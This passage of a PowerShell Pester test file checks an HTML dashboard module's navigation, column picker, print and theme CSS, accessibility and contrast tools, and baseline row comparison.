            $h | Should -Match '\[data-navoverflow="wrap"\] \.nav-strip-top \{ flex: 1 1 auto;'
        }
        It 'emits no inline on* handler; the Top button is bound by the runtime (2.5.3)' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            $markup = [regex]::Replace($h, '(?s)<script\b[^>]*>.*?</script>', '')
            $markup | Should -Not -Match '\son[a-z]+\s*='
            $h | Should -Match 'id="btn-nav-top"'
            $h | Should -Match "getElementById\('btn-nav-top'\)"
        }
        It 'has one tab stop per strip, arrow keys, Escape and focus restore' {
            $h = Export-DhTestHtml -Report (& $script:newReport @{})
            (Get-DhTestJsFunction -Html $h -Name 'dhNavKeydown') | Should -Match "ArrowRight"
            (Get-DhTestJsFunction -Html $h -Name 'dhNavKeydown') | Should -Match "Escape"
            (Get-DhTestJsFunction -Html $h -Name 'dhNavTabStop') | Should -Match 'tabIndex = 0'
            (Get-DhTestJsFunction -Html $h -Name 'applyNav') | Should -Match 'focusKey'
            (Get-DhTestJsFunction -Html $h -Name 'renderNavStrips') | Should -Match "aria-current"
            (Get-DhTestJsFunction -Html $h -Name 'renderNavCrumb') | Should -Match "role', 'navigation'"
        }
    }

    Context 'Show-DhNavMap reads the new attributes' {
        It 'does not fail on a page with a skeleton and All nodes' {
            $r = & $script:newReport @{ NavAllLabel = 'All'; NavTree = @(@{ Path = 'Network' }, @{ Path = 'Storage' }) }
            $f = Join-Path ([IO.Path]::GetTempPath()) ('nm_' + [guid]::NewGuid().ToString('N') + '.html')
            try {
                Set-Content -LiteralPath $f -Value (Export-DhTestHtml -Report $r) -Encoding utf8
                $map = & (Join-Path $script:root 'Tools/Show-DhNavMap.ps1') -Path $f -Quiet -PassThru 6>$null
                @($map.Views).Count | Should -BeGreaterThan 1
            } finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
        }
    }
}

Describe 'v2.5.0 column picker' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:rows = @([pscustomobject]@{ a = 1; b = 2; c = 3 })
        $script:export = {
            param([hashtable] $Table = @{}, [object[]] $Columns = $null, [string] $Title = 'T')
            $r = New-DhDashboard -Title $Title -GeneratedBy 'g.ps1'
            if ($Columns) { Add-DhTable -Report $r -TableId 'tb' -Title 'T' -Data $script:rows -Columns $Columns @Table }
            else { Add-DhTable -Report $r -TableId 'tb' -Title 'T' -Data $script:rows @Table }
            Export-DhTestHtml -Report $r
        }
        $script:cols = @(@{ Field = 'a'; Label = 'A' }, @{ Field = 'b'; Label = 'B'; Hidden = $true }, @{ Field = 'c'; Label = 'C' })
    }

    Context 'Add-DhTable' {
        It 'emits hidden and remember only when used (existing tables export unchanged)' {
            $h = & $script:export @{} $null
            $h | Should -Not -Match '"hidden"'
            $h | Should -Not -Match '"remember"'
            $h = & $script:export @{ RememberColumns = $true } $script:cols
            $h | Should -Match '"field":"b","label":"B","hidden":true'
            $h | Should -Match '"remember":"[0-9a-f]{16}"'
        }
        It 'derives the same key for the same report and table, and a different one otherwise' {
            $k = { param($h) [regex]::Match($h, '"remember":"([0-9a-f]{16})"').Groups[1].Value }
            $a = & $k (& $script:export @{ RememberColumns = $true } $script:cols 'Report A')
            $b = & $k (& $script:export @{ RememberColumns = $true } $script:cols 'Report A')
            $c = & $k (& $script:export @{ RememberColumns = $true } $script:cols 'Report B')
            $a | Should -Be $b
            $a | Should -Not -Be $c
        }
        It 'rejects a non-boolean Hidden and a table where every column is hidden' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'x' -Title 'X' -Data $script:rows -Columns @(@{ Field = 'a'; Label = 'A'; Hidden = 'yes' }, @{ Field = 'b'; Label = 'B' }) } | Should -Throw '*Hidden must be*'
            { Add-DhTable -Report $r -TableId 'y' -Title 'Y' -Data $script:rows -Columns @(@{ Field = 'a'; Label = 'A'; Hidden = $true }) } | Should -Throw '*every column is Hidden*'
        }
    }

    Context 'Runtime' {
        BeforeAll { $script:html = & $script:export @{ RememberColumns = $true } $script:cols }
        It 'starts hidden columns unticked, ticks by the live state, labels the button and offers a reset' {
            $script:html | Should -Match 'colVisible\[i\]=!col\.hidden'
            $fn = Get-DhTestJsFunction -Html $script:html -Name '_buildColToggle'
            $fn | Should -Match 'chk\.checked=self\.colVisible\[i\]!==false'
            $fn | Should -Match 'Default columns'
            $fn | Should -Match '_colToggleLabel\(\)'
            (Get-DhTestJsFunction -Html $script:html -Name '_colToggleLabel') | Should -Match "hidden\)"
        }
        It 'keeps the choice by field name, guarded against blocked storage (node)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
            $src = ('_colsKey', '_restoreCols', '_saveCols' | ForEach-Object { Get-DhTestJsFunction -Html $script:html -Name $_ }) -join "`n"
            $js = @'
const TableEngine = function () {};
'@ + "`n" + $src + @'

const store = new Map();
global.window = { localStorage: { getItem: k => store.has(k) ? store.get(k) : null, setItem: (k, v) => store.set(k, v), removeItem: k => store.delete(k) } };
const mk = (key) => ({ _colsKey: TableEngine.prototype._colsKey, rememberKey: key, columns: [{ field: 'a' }, { field: 'b', hidden: true }, { field: 'c' }], colVisible: { 0: true, 1: false, 2: true } });
const e1 = mk('abc'); e1.colVisible[0] = false; e1.colVisible[1] = true; TableEngine.prototype._saveCols.call(e1);
const saved = JSON.parse(store.get('dh:cols:abc'));
const e2 = mk('abc'); TableEngine.prototype._restoreCols.call(e2);
const e3 = mk('');   e3.colVisible[0] = false; TableEngine.prototype._saveCols.call(e3);          // no key: nothing stored
const e4 = { _colsKey: TableEngine.prototype._colsKey, rememberKey: 'abc', columns: [{ field: 'a' }, { field: 'z' }], colVisible: { 0: true, 1: true } };   // a column added later keeps its default
TableEngine.prototype._restoreCols.call(e4);
global.window.localStorage.getItem = () => { throw new Error('blocked'); };
global.window.localStorage.setItem = () => { throw new Error('blocked'); };
let blocked = 'ok'; try { TableEngine.prototype._saveCols.call(mk('abc')); TableEngine.prototype._restoreCols.call(mk('abc')); } catch (x) { blocked = 'threw'; }
console.log([JSON.stringify(saved), JSON.stringify(e2.colVisible), store.size, JSON.stringify(e4.colVisible), blocked].join(' | '));
'@
            $f = Join-Path ([IO.Path]::GetTempPath()) ('dhcols_' + [guid]::NewGuid().ToString('N') + '.js')
            try { Set-Content -LiteralPath $f -Value $js -Encoding utf8NoBOM; $out = (& node $f 2>&1) -join "`n" } finally { Remove-Item -LiteralPath $f -ErrorAction SilentlyContinue }
            $out | Should -Be '{"a":false,"b":true,"c":true} | {"0":false,"1":true,"2":true} | 1 | {"0":false,"1":true} | ok'
        }
    }
}

Describe 'v2.4.2 print and theme checks' {
    BeforeAll {
        $d = Join-Path (Split-Path $PSScriptRoot) 'DashHtml/Private'
        . (Join-Path $d 'Get-DhCssBase.ps1')
        $script:base = Get-DhCssBase
        $script:themes = foreach ($th in 'Default', 'Azure', 'VMware', 'Grey', 'Company', 'Rag') { foreach ($m in 'Light', 'Dark') {
            . (Join-Path $d "Get-DhCss$th$m.ps1"); [pscustomobject]@{ Name = "$th$m"; Css = (& "Get-DhCss$th$m") } } }
    }
    It 'every CSS variable used without a fallback is defined in <Name>' -ForEach @(
        'Default', 'Azure', 'VMware', 'Grey', 'Company', 'Rag' | ForEach-Object { $n = $_; 'Light', 'Dark' | ForEach-Object { @{ Name = "$n$_" } } }) {
        $used = [regex]::Matches($script:base, 'var\((--[\w-]+)\s*\)') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
        $css = ($script:themes | Where-Object Name -eq $Name).Css
        $defined = [regex]::Matches($script:base + $css, '(--[\w-]+)\s*:') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique
        @($used | Where-Object { $_ -notin $defined }) | Should -BeNullOrEmpty
    }
    It 'print rules wrap wide tables and keep the map and tree printable' {
        $script:base | Should -Match '(?s)@media print \{\s*\.table-section \{ overflow: visible; \}\s*\.data-table \{ width: 100% !important'
        $script:base | Should -Match '(?s)@media print \{\s*\.network-map-toolbar, \.nm-status \{ display: none !important; \}'
        $script:base | Should -Match '(?s)\.treefilter-toolbar, \.dh-tree-info, \.treefilter-empty \{ display: none !important; \}'
    }
}
Describe 'v2.5.1 hardening' {
    BeforeAll { . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1') }
    It 'runs the node runtime tests (node --test Tests/js/*.test.js)' -Skip:(-not (Get-Command node -ErrorAction SilentlyContinue)) {
        Push-Location (Split-Path $PSScriptRoot)
        try { $out = & node --test 'Tests/js/*.test.js' 2>&1 | Out-String; $LASTEXITCODE | Should -Be 0 -Because $out }
        finally { Pop-Location }
    }
    It 'rounds an unformatted footer average instead of showing 37.333333333' {
        $r = New-DhDashboard -Title 'F'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ v = 1 }, [pscustomobject]@{ v = 1 }, [pscustomobject]@{ v = 2 }) `
            -Columns @(@{ Field = 'v'; Label = 'V'; Aggregate = 'avg' })
        $h = Export-DhTestHtml -Report $r
        $h | Should -Match "result\.toFixed\(col\.decimals >= 0 \? col\.decimals : 2\)"
    }
}
Describe 'v2.5.1 print and contrast fixes' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $d = Join-Path (Split-Path $PSScriptRoot) 'DashHtml/Private'
        . (Join-Path $d 'Get-DhCssBase.ps1'); $script:base = Get-DhCssBase
    }
    It 'drops soft shadows in print (blurred shadow groups hid heatmap cells and block titles in the PDF)' {
        $script:base | Should -Match '(?s)@media print \{.{0,900}\*, \*::before, \*::after \{ box-shadow: none !important; text-shadow: none !important; \}'
    }
    It 'tightens wide tables in print' {
        $script:base | Should -Match '\.data-table th, \.data-table td \{ padding: 3px 4px !important; \}'
        $script:base | Should -Match '\.data-table td svg \{ max-width: 64px'
    }
    It 'gives every heatmap cell a text colour picked against its own background' {
        $r = New-DhDashboard -Title 'H'
        Add-DhHeatmap -Report $r -Id 'h' -Title 'H' -Rows @('a') -Columns @('x', 'y') -Cells @(@{ Row = 'a'; Column = 'x'; Value = 1 }, @{ Row = 'a'; Column = 'y'; Value = 99 }) -ShowValues
        $h = Export-DhTestHtml -Report $r
        $h | Should -Match "color:'\+dhTextOn\(col\)"
    }
    It 'nav badge and tree table type letters use the primary text colour' {
        $script:base | Should -Match '(?s)\.nav-badge \{[^}]*color: var\(--text-primary\)'
        $script:base | Should -Match '\.tt-type \{ color: var\(--text-primary\); \}'
    }
}
Describe 'v2.5.2 release hygiene and contrast tool' {
    It 'keeps the manifests'' ReleaseNotes well under the PSGallery cap (<Name>)' -ForEach @(
        @{ Name = 'DashHtml';        Path = (Join-Path $PSScriptRoot '../DashHtml/DashHtml.psd1') }
        @{ Name = 'DashHtml.Design'; Path = (Join-Path $PSScriptRoot '../DashHtml.Design/DashHtml.Design.psd1') }) {
        $m = Import-PowerShellDataFile -LiteralPath $Path
        $len = ([string]$m.PrivateData.PSData.ReleaseNotes).Length
        $len | Should -BeLessThan 9500 -Because 'the cap is 10,600 and the next release needs room'
    }
    It 'ships the contrast tool with its selector list and measuring script' {
        foreach ($f in 'Test-DhContrast.ps1', 'contrast-selectors.json', 'contrast-measure.js') { Test-Path (Join-Path $PSScriptRoot "../Tools/$f") | Should -BeTrue }
        $cfg = Get-Content (Join-Path $PSScriptRoot '../Tools/contrast-selectors.json') -Raw | ConvertFrom-Json
        @($cfg.selectors).Count | Should -BeGreaterThan 15
    }
    It 'finds no text below the minimum contrast in the Default theme, light and dark (needs Edge or Chrome)' -Skip:(-not (& (Join-Path $PSScriptRoot '../Tools/Find-DhBrowser.ps1'))) {
        $r = @(& (Join-Path $PSScriptRoot '../Tools/Test-DhContrast.ps1') -Theme Default -PassThru 6>$null)
        ($r | ForEach-Object { "$($_.Ratio) $($_.Selector) $($_.Text)" }) | Should -BeNullOrEmpty
    }
}
Describe 'v2.5.2 accessibility' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $r = New-DhDashboard -Title 'A11y' -NavTitle 'A' -Search
        Add-DhSummary -Report $r -Items @(@{ Label = 'One'; Value = 1 }, @{ Label = 'Two'; Value = 2 })
        $rows = 1..12 | ForEach-Object { [pscustomobject]@{ Name = "n$_"; Site = "s$($_ % 3)"; Size = $_ * 3 } }
        Add-DhTable -Report $r -TableId 'sel' -Title 'Selectable' -Data $rows -MultiSelect -NavPath 'One' -Columns @(
            @{ Field = 'Name'; Label = 'Name' }, @{ Field = 'Site'; Label = 'Site' }, @{ Field = 'Size'; Label = 'Size'; Aggregate = 'sum' })
        Add-DhFindings -Report $r -Id 'f' -Title 'Findings' -NavPath 'One' -Findings @(@{ Id = 'a'; Title = 'A finding'; Severity = 'warning'; Description = 'text' })
        $script:html = Export-DhTestHtml -Report $r
        $script:probe = Join-Path $PSScriptRoot '../Tools/Test-DhA11y.ps1'
        $script:tmp = Join-Path ([IO.Path]::GetTempPath()) ('dh_a11y_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmp | Out-Null
    }
    AfterAll { if (Test-Path -LiteralPath $script:tmp) { [IO.Directory]::Delete($script:tmp, $true) } }
    It 'names the table filter and the select-all checkbox, and gives rows aria-selected' {
        $script:html | Should -Match 'id="filter-sel"[^>]*aria-label="Filter Selectable"'
        $script:html | Should -Match 'id="filter-clear-sel"[^>]*aria-label="Clear filter"'
        $script:html | Should -Match 'aria-label="Select all rows"'
        $script:html | Should -Match "chk\.setAttribute\('aria-label','Select row '"
        $script:html | Should -Match "tr\.setAttribute\('aria-selected'"
    }
    It 'binds every collapsible header through dhBindCollapsible (keyboard and aria-expanded)' {
        $script:html | Should -Match 'function dhBindCollapsible\(toggle, body, chevron\)'
        ([regex]::Matches($script:html, 'dhBindCollapsible\(toggle, body, chev(ron)?\)')).Count | Should -BeGreaterOrEqual 3
    }
    It 'passes the audit with no errors or warnings (needs Edge or Chrome)' -Skip:(-not (& (Join-Path $PSScriptRoot '../Tools/Find-DhBrowser.ps1'))) {
        $file = Join-Path $script:tmp 'ok.html'
        Set-Content -LiteralPath $file -Value $script:html -Encoding utf8
        $f = @(& $script:probe -Path $file -Strict -PassThru 6>$null)
        ($f | ForEach-Object { "$($_.Severity) $($_.Rule) $($_.Sample)" }) | Should -BeNullOrEmpty
    }
    It 'finds the defects it is meant to find (needs Edge or Chrome)' -Skip:(-not (& (Join-Path $PSScriptRoot '../Tools/Find-DhBrowser.ps1'))) {
        $file = Join-Path $script:tmp 'bad.html'
        Set-Content -LiteralPath $file -Encoding utf8 -Value '<!doctype html><html><head><title>x</title></head><body><button></button><div class="collapsible-toggle">T</div><table class="data-table"><tr><th class="sortable">A</th></tr></table><div id="a"></div><div id="a"></div></body></html>'
        $rules = @(& $script:probe -Path $file -PassThru 6>$null | ForEach-Object Rule)
        foreach ($want in 'control-without-name', 'duplicate-id', 'expandable-not-keyboard-operable', 'sortable-header-without-aria-sort', 'html-without-lang', 'no-main-landmark') { $rules | Should -Contain $want }
    }
}
Describe 'v2.5.2 baseline markers' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        Import-Module (Join-Path $PSScriptRoot '../DashHtml.Design/DashHtml.Design.psd1') -Force   # this checkout, not an installed copy
        $script:data = @(
            [pscustomobject]@{ Name = 'a'; V = 1; W = 'x' }, [pscustomobject]@{ Name = 'b'; V = 2; W = 'y' },
            [pscustomobject]@{ Name = 'c'; V = 3; W = 'z' }, [pscustomobject]@{ Name = 'd'; V = 4; W = $null })
        $script:base = @(
            [pscustomobject]@{ Name = 'A'; V = 1; W = 'x' }, [pscustomobject]@{ Name = 'b'; V = 9; W = 'y' },
            [pscustomobject]@{ Name = 'd'; V = 4; W = '' }, [pscustomobject]@{ Name = 'gone'; V = 5; W = 'q' })
        $script:diff = & (Get-Module DashHtml) { param($d, $b) Get-DhBaselineDiff -Data $d -Baseline $b -KeyField Name } $script:data $script:base
        $script:render = {
            param([hashtable] $Extra = @{})
            $r = New-DhDashboard -Title 'B'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:data @Extra
            Export-DhTestHtml -Report $r
        }
    }
    Context 'comparison' {
        It 'finds new, changed, removed and unchanged rows by key (case-insensitive; null equals empty)' {
            $script:diff.Counts.New | Should -Be 1        # c
            $script:diff.Counts.Changed | Should -Be 1    # b: V 2 vs 9
            $script:diff.Counts.Removed | Should -Be 1    # gone
            $script:diff.Counts.Same | Should -Be 2       # a (key case differs) and d (null vs empty)
            $script:diff.Changes['2'].State | Should -Be 'new'
            $script:diff.Changes['1'].Fields | Should -Be @('V')
            $script:diff.Changes['1'].Was['V'] | Should -Be 9
            @($script:diff.Removed).Count | Should -Be 1
        }
        It 'compares only -BaselineFields when given' {
            $d = & (Get-Module DashHtml) { param($a, $b) Get-DhBaselineDiff -Data $a -Baseline $b -KeyField Name -Fields @('W') } $script:data $script:base
            $d.Counts.Changed | Should -Be 0
        }
        It 'throws on a duplicate key in the data or in the baseline, and on a data row without the key' {
            { & (Get-Module DashHtml) { Get-DhBaselineDiff -Data @([pscustomobject]@{ K = 1 }, [pscustomobject]@{ K = 1 }) -Baseline @() -KeyField K } } | Should -Throw '*duplicate*data*'
            { & (Get-Module DashHtml) { Get-DhBaselineDiff -Data @() -Baseline @([pscustomobject]@{ K = 1 }, [pscustomobject]@{ K = 1 }) -KeyField K } } | Should -Throw '*duplicate*baseline*'
            { & (Get-Module DashHtml) { Get-DhBaselineDiff -Data @([pscustomobject]@{ X = 1 }) -Baseline @() -KeyField K } } | Should -Throw '*not a property of data row 1*'
        }
        It 'ignores a baseline row without the key and says so' {
            $d = & (Get-Module DashHtml) { Get-DhBaselineDiff -Data @([pscustomobject]@{ K = 1 }) -Baseline @([pscustomobject]@{ X = 1 }) -KeyField K }
            $d.Warnings | Should -Match 'no .K. property'
        }
    }
    Context 'Add-DhTable' {
        It 'needs -KeyField with -Baseline and warns about -KeyField alone' {
            $r = New-DhDashboard -Title 'x'
            { Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:data -Baseline $script:base } | Should -Throw '*needs -KeyField*'
            $w = Add-DhTable -Report $r -TableId 't2' -Title 'T' -Data $script:data -KeyField Name 3>&1
            ($w | Out-String) | Should -Match 'no effect without -Baseline'
        }
        It 'warns when the baseline is empty and marks every row New' {
            $r = New-DhDashboard -Title 'x'
            $w = Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:data -Baseline @() -KeyField Name 3>&1
            ($w | Out-String) | Should -Match 'baseline is empty'
            $r.Tables[0].Baseline.Counts.New | Should -Be 4
        }
        It 'emits baseline JSON only when -Baseline is used (a plain table is unchanged)' {
            (& $script:render @{}) | Should -Not -Match '"baseline"'
            $h = & $script:render @{ Baseline = $script:base; KeyField = 'Name'; BaselineLabel = 'last night' }
            $h | Should -Match '"baseline":\{"label":"last night","key":"Name","new":1,"changed":1,"removed":1'
            $h | Should -Match '"changes":\{"1":\{"s":"c","f":\["V"\],"w":\{"V":9\}\},"2":\{"s":"n"'
            $h | Should -Match '"removedRows":\[\{"Name":"gone","V":5,"W":"q"\}\]'
        }
    }
    Context 'runtime and tooling' {
        It 'ships the chips, the removed group and the export hook' {
            $h = & $script:render @{ Baseline = $script:base; KeyField = 'Name' }
            $h | Should -Match 'function dhBaselineNote\(b\)'
            $h | Should -Match "_buildChangeBar = function"
            $h | Should -Match 'class=.{1,2}chg-chip.{1,2}'
            $h | Should -Match "__change"
            $h | Should -Match "details\.tbl-removed"        # printed open
        }
        It 'does not write the baseline into the YAML layout' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:data -Baseline $script:base -KeyField Name
            $y = $r | ConvertTo-DhYaml
            $y | Should -Not -Match 'Baseline|removedRows|Counts'
        }
        It 'is in the generated schema as typed parameters' {
            $s = (Export-DhYamlSchema -AsObject).properties.tables.items.properties
            $s.Contains('Baseline') | Should -BeTrue
            $s.Contains('keyField') | Should -BeTrue
            $s['BaselineFields'].type | Should -Contain 'array'
        }
    }
}
Describe 'v2.5.2 review fixes' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:repo = Split-Path $PSScriptRoot
    }
    It 'compares only the table columns by default, so a hidden timestamp does not mark rows Changed' {
        $r = New-DhDashboard -Title 'x'
        $now = @([pscustomobject]@{ Name = 'a'; Cpu = 1; LastSeen = [datetime]'2026-10-19' })
        $old = @([pscustomobject]@{ Name = 'a'; Cpu = 1; LastSeen = [datetime]'2026-10-18' })
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $now -Baseline $old -KeyField Name -Columns @(@{ Field = 'Name'; Label = 'Name' }, @{ Field = 'Cpu'; Label = 'CPU' })
        $r.Tables[0].Baseline.Counts.Changed | Should -Be 0
        Add-DhTable -Report $r -TableId 't2' -Title 'T' -Data $now -Baseline $old -KeyField Name -BaselineFields LastSeen -Columns @(@{ Field = 'Name'; Label = 'Name' })
        $r.Tables[1].Baseline.Counts.Changed | Should -Be 1
    }
    It 'warns when a field is a date on one side and text on the other' {
        $r = New-DhDashboard -Title 'x'
        $w = Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ Name = 'a'; When = [datetime]'2026-10-18 10:00' }) `
            -Baseline @([pscustomobject]@{ Name = 'a'; When = '2026-10-18 10:00:00' }) -KeyField Name 3>&1
        ($w | Out-String) | Should -Match "'When' is a date on one side and text on the other in 1 row"
    }
    It 'lints a Global item that also has a path, and the nav map leaves its node out' {
        $r = New-DhDashboard -Title 'P' -StrictNav
        Add-DhHtmlBlock -Report $r -Id 'a' -Title 'A' -Content 'x' -NavPath 'Live/One'
        Add-DhHtmlBlock -Report $r -Id 'g' -Title 'G' -Content 'x' -NavPath 'Ghost/Item' -NavScope Global
        $res = Export-DhTestHtml -Report $r -WithWarnings
        ($res.Warnings -join ' ') | Should -Match "'g' has -NavPath 'Ghost/Item' with -NavScope Global"
        $f = Join-Path ([IO.Path]::GetTempPath()) ('dh_nm_' + [guid]::NewGuid().ToString('N') + '.html')
        try {
            Set-Content -LiteralPath $f -Value $res.Html -Encoding utf8
            $map = (& (Join-Path $script:repo 'Tools/Show-DhNavMap.ps1') -Path $f 6>&1 | Out-String)
            $map | Should -Not -Match 'Ghost'
            $map | Should -Match 'Live'
        } finally { [IO.File]::Delete($f) }
    }
    It 'ships the CSV formula guard on both CSV paths and the tag-free copy cell' {
        $r = New-DhDashboard -Title 'x'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ a = 1 })
        $h = Export-DhTestHtml -Report $r
        ([regex]::Matches($h, 'dhCsvSafe\(FMT\.forExport')).Count | Should -Be 2
        $h | Should -Match 'var text = dhCellText\(td\);'
    }
    It 'the accessibility tool exits with 1 when it finds an error (needs Edge or Chrome)' -Skip:(-not (& (Join-Path $PSScriptRoot '../Tools/Find-DhBrowser.ps1'))) {
        $f = Join-Path ([IO.Path]::GetTempPath()) ('dh_a11y_exit_' + [guid]::NewGuid().ToString('N') + '.html')
        try {
            Set-Content -LiteralPath $f -Encoding utf8 -Value '<!doctype html><html><head><title>x</title></head><body><button></button></body></html>'
            pwsh -NoProfile -File (Join-Path $script:repo 'Tools/Test-DhA11y.ps1') -Path $f 6>$null | Out-Null
            $LASTEXITCODE | Should -Be 1
        } finally { [IO.File]::Delete($f) }
    }
    It 'the browser probe passes -WindowStyle only on Windows' {
        $src = Get-Content (Join-Path $script:repo 'Tools/BrowserProbe.ps1') -Raw
        $src | Should -Match "if \(\`$IsWindows\) \{ \`$start\.WindowStyle = 'Hidden' \}"
        $src | Should -Not -Match '-WindowStyle Hidden'
    }
}

Describe 'v2.5.4 data fields named Keys, Values or Count' {
    # On a dictionary, $d.Keys / $d.Count return the ENTRY of that name when there is one,
    # so every dictionary keyed by data must be read through PSBase.
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:rowsOf = {
            param([string] $Html)
            $m = [regex]::Match($Html, '"data":(\[\{.*?\}\])')
            $m.Success | Should -BeTrue
            @($m.Groups[1].Value | ConvertFrom-Json)
        }
    }
    It 'exports every field of a <Kind> row' -ForEach @(
        @{ Kind = 'pscustomobject' }, @{ Kind = 'hashtable' }, @{ Kind = 'ordered' }, @{ Kind = 'generic dictionary' }
    ) {
        $row = switch ($Kind) {
            'pscustomobject' { [pscustomobject]@{ A = 1; Keys = 'First event field'; Values = 'v'; Count = 'c' } }
            'hashtable'      { @{ A = 1; Keys = 'First event field'; Values = 'v'; Count = 'c' } }
            'ordered'        { [ordered]@{ A = 1; Keys = 'First event field'; Values = 'v'; Count = 'c' } }
            default {
                $d = [System.Collections.Generic.Dictionary[string, object]]::new()
                $d['A'] = 1; $d['Keys'] = 'First event field'; $d['Values'] = 'v'; $d['Count'] = 'c'
                $d
            }
        }
        $r = New-DhDashboard -Title 'x'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @($row)
        @($r.Tables[0].Columns | ForEach-Object { $_.Field } | Sort-Object) | Should -Be @('A', 'Count', 'Keys', 'Values')
        $rows = & $script:rowsOf (Export-DhTestHtml -Report $r)
        $rows | Should -HaveCount 1
        $rows[0].A      | Should -Be 1
        $rows[0].Keys   | Should -Be 'First event field'
        $rows[0].Values | Should -Be 'v'
        $rows[0].Count  | Should -Be 'c'
        @($rows[0].PSObject.Properties.Name) | Should -HaveCount 4
    }
    It 'finds Keys / Count as data fields for chart validation' {
        $r = New-DhDashboard -Title 'x'
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Columns @(@{ Field = 'Name'; Label = 'Name' }) -Data @(
            [pscustomobject]@{ Name = 'a'; Keys = 'k'; Count = 3 }, [pscustomobject]@{ Name = 'b'; Keys = 'l'; Count = 5 })
        { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 't' -Field 'Keys' -ValueField 'Count' } | Should -Not -Throw
        { Add-DhRangeBar -Report $r -Id 'rb' -Title 'R' -TableId 't' -CategoryField 'Keys' -ValueField 'Count' } | Should -Not -Throw
    }
    It 'compares a baseline keyed on Keys with a changed Count' {
        $r = New-DhDashboard -Title 'x'
        $now = @([pscustomobject]@{ Keys = 'k1'; Count = 2 }, [pscustomobject]@{ Keys = 'k2'; Count = 1 })
        $old = @([pscustomobject]@{ Keys = 'k1'; Count = 1 }, [pscustomobject]@{ Keys = 'Keys'; Count = 5 })
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $now -Baseline $old -KeyField 'Keys'
        $bl = $r.Tables[0].Baseline
        $bl.Counts.New     | Should -Be 1
        $bl.Counts.Changed | Should -Be 1
        $bl.Counts.Removed | Should -Be 1
        $bl.Removed[0]['Keys'] | Should -Be 'Keys'
        $bl.Changes['0'].Fields | Should -Be @('Count')
        $h = Export-DhTestHtml -Report $r
        $h | Should -Match '"0":\{"s":"c","f":\["Count"\],"w":\{"Count":1\}\}'
        $h | Should -Match '"removedRows":\[\{"Keys":"Keys","Count":5\}\]'
    }
    It 'keeps tree-table properties and bar-chart key classes named Keys or Count' {
        $r = New-DhDashboard -Title 'x'
        Add-DhTreeTable -Report $r -Id 'dir' -Title 'Dir' -Rows @(@{ Id = 'g'; Type = 'group'; Label = 'G'; Properties = [ordered]@{ Count = '7'; Keys = 'k' } })
        Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ Sev = 'Count' })
        Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 't' -Field 'Sev' -KeyClass @{ Count = 'cell-danger'; Keys = 'cell-ok' }
        $h = Export-DhTestHtml -Report $r
        $h | Should -Match '"props":\[\{"label":"Count","value":"7"\},\{"label":"Keys","value":"k"\}\]'
        $h | Should -Match '"keyClass":\{"Count":"cell-danger","Keys":"cell-ok"\}'
    }
}

Describe 'v2.6.0 features' {
    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_260_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmp | Out-Null
        $script:rows = @(
            [pscustomobject]@{ Name = 'a'; Id = 'x 1'; Cpu = 5; Page = 'a.html' }
            [pscustomobject]@{ Name = 'b'; Id = 'x/2'; Cpu = 9; Page = 'N/A' })
        $script:export = {
            param($Report, [hashtable] $Extra = @{})
            $p = Join-Path $script:tmp ([guid]::NewGuid().ToString('N') + '.html')
            Export-DhDashboard -Report $Report -OutputPath $p -Force -WarningVariable w -WarningAction SilentlyContinue @Extra
            [pscustomobject]@{ Html = (Get-Content -LiteralPath $p -Raw); Warnings = @($w | ForEach-Object { [string]$_ }); Bytes = (Get-Item $p).Length }
        }
    }
    AfterAll { Remove-Item -LiteralPath $script:tmp -Recurse -Force -ErrorAction SilentlyContinue }

    Context 'O9 -BaselinePath' {
        BeforeAll {
            $script:old = @([pscustomobject]@{ Name = 'a'; Cpu = 1 }, [pscustomobject]@{ Name = 'z'; Cpu = 2 })
            $script:old | Export-Clixml (Join-Path $script:tmp 'b.clixml')
            $script:old | Export-Csv (Join-Path $script:tmp 'b.csv')
            $script:old | ConvertTo-Json | Set-Content (Join-Path $script:tmp 'b.json')
        }
        It 'reads a <Ext> baseline: one changed, one new, one removed' -ForEach @(@{ Ext = 'clixml' }, @{ Ext = 'csv' }, @{ Ext = 'json' }) {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows -Columns @(@{ Field = 'Name'; Label = 'N' }, @{ Field = 'Cpu'; Label = 'C' }) `
                -BaselinePath (Join-Path $script:tmp "b.$Ext") -KeyField 'Name'
            $c = $r.Tables[0].Baseline.Counts
            "$($c.New)/$($c.Changed)/$($c.Removed)" | Should -Be '1/1/1'
